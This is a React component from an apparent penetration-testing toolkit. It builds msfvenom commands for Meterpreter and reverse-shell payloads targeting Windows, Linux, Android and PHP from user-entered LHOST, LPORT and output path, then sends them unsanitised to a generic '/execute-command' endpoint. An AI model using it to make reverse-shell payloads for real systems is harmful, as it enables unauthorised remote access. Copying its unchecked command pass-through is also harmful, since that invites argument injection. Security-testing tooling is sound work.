import React, { useCallback, useState } from "react";
import { Button, LoadingOverlay, Stack, Select, TextInput, Title } from "@mantine/core";
import { useForm } from "@mantine/form";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";

interface FormValues {
    payloadType: string;
    lhost: string;
    lport: string;
    outputFile: string;
}

const payloadTypes = [
    { label: "Windows Meterpreter Reverse TCP", value: "windows/meterpreter/reverse_tcp" },
    { label: "Linux Shell Reverse TCP", value: "linux/x86/shell_reverse_tcp" },
    { label: "Android Meterpreter Reverse TCP", value: "android/meterpreter/reverse_tcp" },
    { label: "PHP Meterpreter Reverse TCP", value: "php/meterpreter_reverse_tcp" },
];

export function Msfvenom() {
    const [loading, setLoading] = useState(false);
    const [output, setOutput] = useState("");

    const form = useForm<FormValues>({
        initialValues: {
            payloadType: "",
            lhost: "",
            lport: "",
            outputFile: "",
        },
    });

    const onSubmit = async (values: FormValues) => {
        setLoading(true);

        const args = [
            "/home/blank/Desktop/Deakin-Detonator-Toolkit/src-tauri/exploits/msfvenom.py",
            "-p",
            values.payloadType,
            "LHOST=" + values.lhost,
            "LPORT=" + values.lport,
            "-o",
            values.outputFile,
        ];

        try {
            const response = await fetch("/execute-command", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ command: args }),
            });

            if (response.ok) {
                const data = await response.json();
                if (data.error) {
                    setOutput(`Error: ${data.error}`);
                } else {
                    setOutput("Payload generated successfully.");
                }
            } else {
                setOutput(`Error: ${response.statusText}`);
            }
        } catch (error) {
            setOutput(`Error: ${(error as Error).message}`);
        }

        setLoading(false);
    };

    const clearOutput = useCallback(() => {
        setOutput("");
    }, []);

    const handlePayloadTypeChange = (value: string) => {
        form.setFieldValue("payloadType", value);
    };

    return (
        <form onSubmit={form.onSubmit(onSubmit)}>
            <LoadingOverlay visible={loading} />
            <Stack>
                <Title>Msfvenom Payload Generator</Title>
                <Select
                    label="Payload Type"
                    required
                    value={form.values.payloadType}
                    onChange={handlePayloadTypeChange}
                    data={payloadTypes}
                />
                <TextInput label="LHOST" required {...form.getInputProps("lhost")} />
                <TextInput label="LPORT" required {...form.getInputProps("lport")} />
                <TextInput
                    label="Output File"
                    required
                    {...form.getInputProps("outputFile")}
                    defaultValue="/home/blank/Desktop/payload.bin"
                />
                <Button type="submit">Generate Payload</Button>
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
            </Stack>
        </form>
    );
}

export default Msfvenom;
